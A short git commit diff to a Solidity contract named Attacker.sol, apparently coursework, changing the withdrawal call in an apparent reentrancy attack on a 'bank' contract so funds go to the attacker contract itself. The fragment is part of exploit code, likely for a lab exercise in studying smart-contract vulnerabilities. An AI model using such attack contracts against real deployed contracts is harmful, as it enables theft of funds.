1792a71f103eb638c30992b028cb5b5ceba7c14d
keem-keem <kareeme@seas.upenn.edu>
2025-04-14 19:19:34 -0400

    Update Attacker.sol

--- Attacker.sol
+++ Attacker.sol
@@ -43,7 +43,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bank.deposit{value: amt}();
 		emit Deposit(amt);
 
-		bank.withdraw(address(bank));
+		bank.withdraw(address(this));
 
 	}
 
